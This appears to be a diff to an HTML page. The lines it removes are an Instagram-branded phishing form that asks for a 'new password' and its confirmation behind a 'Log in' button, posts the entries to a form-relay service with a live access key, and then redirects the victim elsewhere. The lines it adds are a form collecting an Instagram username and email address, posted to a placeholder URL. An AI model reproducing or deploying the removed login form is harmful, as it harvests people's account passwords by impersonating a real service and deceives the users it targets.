@@ -79,15 +79,38 @@ button {
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <form action="https://api.web3forms.com/submit" method="POST">
-      <input type="hidden" name="access_key" value="0f6b356e-b11f-4713-916f-5ef8bead4166">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-      <input type="text" id="username" name="New password" placeholder="Enter your new password">
-      <input type="password" id="password" name="Comfirm your password" placeholder="Confirm your password">
-      <input type="hidden" name="redirect" value="https://openai.com/index/chatgpt/">
-      <button type="submit">Log in</button>
-    </form>
-  </div>
+  <form id="sheet-form">
+  <input type="text" name="username" placeholder="Your Instagram Username" required>
+  <input type="email" name="email" placeholder="Your Email Address" required>
+  <input type="text" name="message" placeholder="Your Message (e.g., feedback)" required>
+  <button type="submit">Submit</button>
+</form>
+
+<script>
+  const form = document.getElementById("sheet-form");
+
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+
+    const formData = {
+      username: form.username.value,
+      email: form.email.value,
+      message: form.message.value
+    };
+
+    fetch("PASTE_YOUR_WEB_APP_URL_HERE", {
+      method: "POST",
+      body: JSON.stringify(formData),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    })
+    .then(response => alert("Form submitted!"))
+    .catch(error => alert("Something went wrong."));
+    
+    form.reset();
+  });
+</script>
 </body>
 </html>
+
